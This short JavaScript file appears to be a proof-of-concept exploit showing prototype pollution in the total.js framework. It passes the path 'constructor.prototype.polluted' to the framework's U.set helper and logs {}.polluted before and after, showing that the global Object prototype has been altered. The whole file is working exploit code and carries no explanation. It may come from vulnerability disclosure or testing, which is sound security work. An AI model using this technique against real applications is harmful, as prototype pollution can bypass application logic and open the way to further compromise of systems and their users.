var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const total = require('total.js');
obj = {};
console.log({}.polluted);
U.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);